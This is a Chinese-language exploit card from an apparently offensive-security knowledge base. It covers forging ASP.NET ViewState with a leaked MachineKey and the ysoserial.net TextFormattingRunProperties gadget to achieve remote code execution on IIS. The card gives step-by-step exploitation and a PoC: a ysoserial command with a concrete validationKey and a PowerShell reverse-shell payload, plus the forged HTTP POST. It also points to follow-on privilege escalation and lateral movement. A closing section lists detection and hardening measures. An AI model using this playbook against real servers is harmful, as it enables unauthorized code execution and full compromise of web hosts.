---
id: web-dotnet-deser-viewstate-machinekey-textformattingrunproperties
title: 已知 MachineKey 伪造 ASP.NET ViewState：ysoserial.net TextFormattingRunProperties 反序列化 RCE
type: scenario
domain: web
path: web/dotnet/deserialization
technique: viewstate-machinekey-textformattingrunproperties
tags:
- dotnet
- aspnet
- deserialization
- viewstate
- machinekey
- ysoserial
- iis
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V74
  verified_at: '2026-11-05T16:34:21+08:00'
  notes: 已对照 content.md 与图22-24核对：__VIEWSTATEGENERATOR=CA0B0334、validation=SHA1/decryption=AES、validationKey、ysoserial.net -p ViewState -g TextFormattingRunProperties 命令与 POST 利用一致；原文 viewStateEncryptionMode=Never，卡内已说明加密场景需 decryptionKey。未验证点：反弹 shell 与 w3wp 身份仅原文截图、未复跑。
url: /docs/web/dotnet/deserialization/web-dotnet-deser-viewstate-machinekey-textformattingrunproperties/
draft: false
kb_aliases:
- ViewState 反序列化
- ASP.NET ViewState RCE
- MachineKey 伪造
- ysoserial.net ViewState
- TextFormattingRunProperties
- __VIEWSTATEGENERATOR
---

## 一句话结论

拿到站点 `web.config` 中的 `validationKey`/`decryptionKey` 与页面 `__VIEWSTATEGENERATOR` 后，可用 ysoserial.net 的 ViewState 插件和 `TextFormattingRunProperties` gadget 构造合法签名的 `__VIEWSTATE`，POST 回页面即可在 IIS 应用池身份下执行任意命令。

## 原理

- ASP.NET WebForms 用隐藏字段 `__VIEWSTATE` 在客户端与服务器之间保存页面/控件状态。服务端反序列化前会用 `machineKey` 对 ViewState 做 MAC 校验（`enableViewStateMac`），必要时再用 `decryptionKey` 解密。
- `machineKey` 是站点级（或机器级）共享密钥，包含 `validationKey`（HMAC 签名）与 `decryptionKey`（AES/DES 加密）。它通常写在 `web.config`，一旦泄露，攻击者就能生成服务器认为“合法”的 ViewState。
- 反序列化本身会调用类型解析器加载类型并还原对象图；`TextFormattingRunProperties`（来自 Microsoft.VisualStudio.Text.Formatting）是一个已知 gadget：其属性中的 `ObjectDataProvider` 可在反序列化/属性展开时调用 `Process.Start`，从而执行命令。
- 页面若设置 `viewStateEncryptionMode="Never"`，ViewState 只签名不加密，构造更简单；若启用加密，则同时用 `decryptionKey` 加密，仍可伪造。
- `__VIEWSTATEGENERATOR` 是页面级标识，服务端可能校验它；从目标页面 HTML 中直接读取即可。ysoserial.net 的 ViewState 插件需要 `--generator`、`--validationalg`、`--validationkey`，按目标配置补齐。
- 之所以成立：ViewState 的安全边界完全依赖 MachineKey 的保密性；密钥泄露后，MAC 与加密都不再提供完整性/机密性保护，反序列化入口就变成可控对象图注入。

## 触发条件

- 目标为 ASP.NET WebForms 页面，存在 `__VIEWSTATE` 字段且服务端会反序列化。
- 已获得站点 `machineKey` 的 `validationKey`（以及启用加密时的 `decryptionKey`）与 `validation`/`decryption` 算法。
- 已获得目标页面的 `__VIEWSTATEGENERATOR`（若插件/页面要求）。
- 目标服务器存在 gadget 所需程序集（`Microsoft.VisualStudio.Text.Formatting` 常见于装了 VS/开发工具的服务器；也可换其他 gadget）。
- 页面允许匿名/低权限 POST，且没有额外的请求签名或 WAF 拦截。

## 利用步骤

1. 访问目标页面，保存完整 HTML，提取 `__VIEWSTATE` 与 `__VIEWSTATEGENERATOR` 的值。
2. 从 `web.config` 或等价泄露中取得 `machineKey` 的 `validationKey`、`decryptionKey`、`validation`（如 SHA1）、`decryption`（如 AES）。
3. 用 ysoserial.net 生成 ViewState payload：
   ```powershell
   .\ysoserial.exe -p ViewState -g TextFormattingRunProperties `
     --generator=<__VIEWSTATEGENERATOR> `
     --validationalg=SHA1 --validationkey=<validationKey> `
     -c "cmd /c powershell -e <base64 反弹 shell>"
   ```
   若页面启用了 ViewState 加密，按工具参数补充 `decryptionkey` 与 `--isencrypted`；若为旧版 .NET，加 `--islegacy`。
4. 将生成的字符串作为 `__VIEWSTATE`，连同原 `__VIEWSTATEGENERATOR` POST 回页面：
   `__VIEWSTATE=<payload>&__VIEWSTATEGENERATOR=<generator>`
5. 观察响应：若返回 “The state information is invalid for this page and might be corrupted”，通常是 key/算法/generator 不匹配；修正后重试。
6. 成功时命令在 `w3wp.exe` 应用池身份下执行（如 `iis apppool\root`），通过反弹 shell 或回显确认权限。
7. 以该身份继续读取配置、横向或本地提权（应用池常带 `SeImpersonatePrivilege`）。

## PoC

```powershell
# 1. 从页面提取 __VIEWSTATEGENERATOR
# <input type="hidden" name="__VIEWSTATEGENERATOR" value="CA0B0334" />

# 2. 生成 ViewState payload
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties `
  --generator=CA0B0334 `
  --validationalg="SHA1" `
  --validationkey="56AB7132992003EE87F74AE4D9675D65EED8018D3528C0B8874905B51940DEAF6B85F1D922D19AB8F69781B2326A2F978A064708822FD8C54ED74CADF8592E17" `
  -c "cmd /c powershell -e <base64-payload>"
```

```http
POST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: <len>

__VIEWSTATE=<ysoserial生成的payload>&__VIEWSTATEGENERATOR=CA0B0334
```

```text
# 成功：命令在 w3wp.exe 应用池身份下执行；失败常见报错：
# "The state information is invalid for this page and might be corrupted."
```

## 变体与关联

- 变体：其他 gadget：`TypeConfuseDelegate`、`ActivitySurrogateSelector`、`WindowsIdentity`、`ObjectDataProvider`；按目标 .NET 版本与已安装程序集选择。
- 变体：若 `enableViewStateMac=false`，无需 validationKey 即可直接构造未签名 ViewState；若 `viewStateEncryptionMode=Always`，需要 decryptionKey。
- 变体：MachineKey 泄露还可用于伪造 Forms 认证 Cookie、ViewStateUserKey 绕过、ASP.NET 反序列化其他入口（如 `__EVENTVALIDATION`）。
- 关联：[[web-generic-file-inclusion-aspx-report-param-traversal-webconfig]]（通过路径遍历读取 web.config 获取 MachineKey 的前置步骤）、[[web-dotnet-deser-u9-datatransfer-binaryformatter-rce]]（另一类 .NET 反序列化入口）、[[web-dotnet-deser-erp-openserverdialog-binaryformatter-rce]]。
- 边界：MachineKey 使用 `AutoGenerate` 且每台机器不同、页面禁用 ViewState、服务端强制 `ViewStateEncryptionMode=Always` 且 decryptionKey 未知、或目标缺少 gadget 程序集时，需要换用其他入口。

## 检测与防御

- 检测：POST 中出现异常长或非正常 Base64 的 `__VIEWSTATE`；`__VIEWSTATEGENERATOR` 与页面不匹配；`w3wp.exe` 派生 `cmd.exe`/`powershell.exe`；IIS 日志中出现 500 “state information is invalid” 的批量请求。
- 修复：保护 `machineKey`（ACL、密钥管理、避免写入可被文件读取/下载的目录）；生产环境启用 `enableViewStateMac=true` 与 `ViewStateEncryptionMode=Always`。
- 加固：定期轮换 MachineKey；升级 .NET Framework 并启用最新安全补丁；对 Web 目录做完整性监控，防止配置文件泄露；WAF 检测 ViewState 反序列化特征。
- 架构：新应用优先使用 ASP.NET Core/MVC（无 WebForms ViewState），减少此类入口。
